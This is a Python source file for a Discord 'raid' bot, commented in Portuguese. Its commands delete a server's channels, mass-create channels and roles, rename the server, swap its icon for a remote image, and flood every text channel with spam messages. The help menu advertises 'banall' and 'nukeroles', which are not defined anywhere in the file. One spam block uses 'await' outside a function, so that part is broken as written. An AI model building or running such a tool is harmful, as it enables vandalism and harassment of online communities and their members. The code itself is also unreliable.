import discord
from discord.ext import commands
import asyncio
import aiohttp
import io
from datetime import datetime, timedelta
import random
# ================= CONFIG =================

class Config:
    TOKEN = "TOKEN"
    PREFIX = "."

    # ===== MESSAGE SETTINGS =====
    SPAM_MESSAGE = ""
    SPAM_COUNT = 10
    TEXT_TO_SPEECH = False

    # ===== CHANNEL SETTINGS =====
    CHANNELS_COUNT = 50
    THREAD_COUNT = 2
    THREAD_NAME = "𝑲𝑨𝑳𝑬𝑩"

    # ===== ROLE SETTINGS =====
    ROLE_NAME = "𝑲𝑨𝑳𝑬𝑩"
    ROLES_COUNT = 50
    NEW_ROLE_NAME = "𝑲𝑨𝑳𝑬𝑩"
    ADMIN_ROLE_NAME = "𝑲𝑨𝑳𝑬𝑩"

    # opcionais usados por raid
    SERVER_NAME = "𝑲𝑨𝑳𝑬𝑩"
    SERVER_ICON_URL = "https://files.catbox.moe/4u10vu.jpg"

config = Config()
spam_tasks = {}

intents = discord.Intents.default()
intents.message_content = True
intents.members = True  # necessário se você usar ctx.guild.members

bot = commands.Bot(command_prefix=config.PREFIX, intents=intents, help_command=None)

@bot.command()
async def kill(ctx):

    mensagem = config.SPAM_MESSAGE

    for channel in ctx.guild.text_channels:
        if channel.id in spam_tasks:
            continue
        spam_tasks[channel.id] = True

        async def send_msg(ch=channel):
            try:
                await ch.send(mensagem)
            except Exception as e:
                print(f"Erro em {ch.name}: {e}")
            spam_tasks.pop(ch.id, None)

        asyncio.create_task(send_msg())

@bot.command()
async def raid(ctx):
    guild = ctx.guild

    # ===== DELETE CHANNELS =====
    if getattr(config, "DELETE_CHANNELS", False):  # só deleta se estiver True
        delete_tasks = []
        for channel in list(guild.channels):
            try:
                delete_tasks.append(channel.delete())
            except Exception as e:
                print(f"Erro ao deletar {channel.name}: {e}")
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        await asyncio.sleep(1)

    # ===== CREATE TEXT CHANNELS =====
    channels_count = getattr(config, "CHANNELS_COUNT", 0)
    if channels_count > 0:
        sem = asyncio.Semaphore(getattr(config, "THREAD_COUNT", 5))
        nome_canal = getattr(config, "CATEGORY_NAME", "Kaleb")

        async def create_text(name):
            async with sem:
                try:
                    await guild.create_text_channel(name)
                except Exception as e:
                    print(f"Erro ao criar canal {name}: {e}")

        create_tasks = [create_text(f"{nome_canal}-{i}") for i in range(channels_count)]
        await asyncio.gather(*create_tasks, return_exceptions=True)

    # ===== CHANGE SERVER ICON =====
    icon_url = getattr(config, "SERVER_ICON_URL", None)
    if icon_url:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url) as resp:
                    if resp.status == 200:
                        data = await resp.read()
                        await guild.edit(icon=data)
        except Exception as e:
            print(f"Erro ao alterar ícone: {e}")

    # ===== CHANGE SERVER NAME =====
    server_name = getattr(config, "SERVER_NAME", None)
    if server_name:
        try:
            await guild.edit(name=server_name)
        except Exception as e:
            print(f"Erro ao alterar nome do servidor: {e}")

    # ===== CREATE ROLES =====
    count_roles = getattr(config, "ROLES_COUNT", 0)
    if count_roles > 0:
        sem_roles = asyncio.Semaphore(getattr(config, "THREAD_COUNT", 5))

        async def create_role(name):
            async with sem_roles:
                await guild.create_role(name=name)
                await asyncio.sleep(0.5)

        role_tasks = []
        for i in range(count_roles):
            role_name = f"{getattr(config, 'ROLE_NAME', 'Role')}-{i}"
            role_tasks.append(create_role(role_name))

        await asyncio.gather(*role_tasks, return_exceptions=True)

# ===== SPAM MESSAGE =====
spam_msg = getattr(config, "SPAM_MESSAGE", "")
spam_count = getattr(config, "SPAM_COUNT", 0)
tts = getattr(config, "TEXT_TO_SPEECH", False)

if spam_msg and spam_count > 0:
    for channel in guild.text_channels:       # percorre todos os canais
        for _ in range(spam_count):           # envia SPAM_COUNT mensagens em cada canal
            try:
                await channel.send(spam_msg, tts=tts)   # envia mensagem
                print(f"[{getattr(config, 'THREAD_NAME', 'Raid')}] Spam enviado no canal: {channel.name}")
                await asyncio.sleep(1)                    # pausa para evitar rate limit
            except Exception as e:
                print(f"Erro ao enviar spam no canal {channel.name}: {e}")

# ================= HELP =================

@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="🖥️ Commands",
        description="List of available bot commands.",
        color=discord.Color.purple(),
        timestamp=datetime.now()
    )

    commands_list = [
        "`banall`",
        "`nukeroles`",
        "`kill`",
        "`raid`"
    ]

    embed.add_field(
        name="Comandos disponíveis",
        value="\n".join(commands_list),
        inline=False
    )

    await ctx.send(embed=embed)

# ================= RUN =================
bot.run("TOKEN")
